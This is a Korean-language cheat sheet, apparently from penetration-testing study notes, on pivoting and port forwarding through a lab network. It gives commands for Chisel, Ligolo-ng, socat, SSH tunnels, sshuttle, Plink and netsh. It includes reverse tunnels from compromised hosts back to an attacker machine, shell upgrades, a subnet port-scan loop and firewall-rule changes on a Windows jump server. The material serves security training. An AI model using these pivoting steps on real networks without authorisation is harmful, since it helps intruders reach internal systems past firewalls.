---
sidebar_position: 6
---

# Port Forwarding

네트워크 피벗팅 및 포트 포워딩 기법 모음입니다.

## 네트워크 예제

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

## Chisel

### Reverse Pivot

**시나리오:** LHOST < APPLICATION SERVER

#### LHOST

```bash
./chisel server -p 9002 -reverse -v
```

#### APPLICATION SERVER

```bash
./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
```

### SOCKS5 / Proxychains

**시나리오:** LHOST > APPLICATION SERVER > NETWORK

#### LHOST

```bash
./chisel server -p 9002 -reverse -v
```

#### APPLICATION SERVER

```bash
./chisel client 192.168.50.10:9002 R:socks
```

## Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

**시나리오:** LHOST > APPLICATION SERVER > NETWORK

### 다운로드

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
```

### 터널 인터페이스 준비

```bash
# 터널 인터페이스 생성
sudo ip tuntap add user $(whoami) mode tun ligolo

# 인터페이스 활성화
sudo ip link set ligolo up
```

### Proxy 설정 (LHOST)

```bash
./proxy -laddr 192.168.50.10:443 -selfcert
```

### Agent 설정 (APPLICATION SERVER)

```bash
./agent -connect 192.168.50.10:443 -ignore-cert
```

### 세션 설정

```bash
# 세션 선택
ligolo-ng » session

# 인터페이스 확인
[Agent : user@target] » ifconfig

# 라우트 추가
sudo ip r add 172.16.50.0/24 dev ligolo

# 시작
[Agent : user@target] » start
```

### Port Forwarding

**시나리오:** LHOST < APPLICATION SERVER > DATABASE SERVER

```bash
[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
```

## Socat

**시나리오:** LHOST > APPLICATION SERVER > DATABASE SERVER

### APPLICATION SERVER

```bash
# 네트워크 확인
ip a
ip r

# 포트 포워딩
socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
```

### LHOST

```bash
psql -h <RHOST> -p 2345 -U postgres
```

## SSH Tunneling

### Local Port Forwarding

**시나리오:** LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

#### APPLICATION SERVER

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh <USERNAME>@192.168.100.10
ip a
ip r

# 포트 스캔
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

# Local Port Forwarding
ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
```

#### LHOST

```bash
smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

### Dynamic Port Forwarding

**시나리오:** LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

#### APPLICATION SERVER

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
```

#### LHOST

```bash
# 포트 확인
sudo ss -tulpn

# proxychains 설정
tail /etc/proxychains4.conf
# socks5 192.168.50.10 9999

# 사용
proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

### Remote Port Forwarding

**시나리오:** LHOST ↔ FIREWALL ↔ APPLICATION SERVER → DATABASE SERVER → WINDOWS HOST

#### LHOST

```bash
# SSH 서버 시작
sudo systemctl start ssh
sudo ss -tulpn
```

#### APPLICATION SERVER

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
```

#### LHOST

```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

### Remote Dynamic Port Forwarding

**시나리오:** LHOST < FIREWALL < APPLICATION SERVER > NETWORK

#### APPLICATION SERVER

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 <USERNAME>@192.168.50.10
```

#### LHOST

```bash
# 포트 확인
sudo ss -tulpn

# proxychains 설정
tail /etc/proxychains4.conf
# socks5 127.0.0.1 9998

# 사용
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
```

## sshuttle

**시나리오:** LHOST > APPLICATION SERVER > NETWORK

### APPLICATION SERVER

```bash
socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
```

### LHOST

```bash
sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
```

## Windows ssh.exe

**시나리오:** LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK

### LHOST

```bash
sudo systemctl start ssh
xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

### WINDOWS JUMP SERVER

```cmd
where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
```

### LHOST

```bash
ss -tulpn

# proxychains 설정
tail /etc/proxychains4.conf
# socks5 127.0.0.1 9998

# 사용
proxychains psql -h 10.10.100.20 -U postgres
```

## Plink

**시나리오:** LHOST < FIREWALL < WINDOWS JUMP SERVER

### LHOST

```bash
# plink.exe 찾기
find / -name plink.exe 2>/dev/null
# /usr/share/windows-resources/binaries/plink.exe
```

### WINDOWS JUMP SERVER

```cmd
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
```

### LHOST

```bash
ss -tulpn
xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
```

## Netsh

**시나리오:** LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER

### LHOST

```bash
xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

### WINDOWS JUMP SERVER

```cmd
# 포트 프록시 추가
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20

# 확인
netstat -anp TCP | findstr "2222"
netsh interface portproxy show all

# 방화벽 규칙 추가
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
```

### LHOST

```bash
# 스캔
sudo nmap -sS 192.168.50.10 -Pn -n -p2222

# 연결
ssh database_admin@192.168.50.10 -p2222
```

### 정리 (WINDOWS JUMP SERVER)

```cmd
# 방화벽 규칙 삭제
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

# 포트 프록시 삭제
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
```

## 참고

- Chisel: 빠르고 간단한 터널링
- Ligolo-ng: 최신 피벗팅 도구
- SSH: 가장 범용적
- sshuttle: VPN처럼 사용
- Windows: ssh.exe, Plink, Netsh 활용
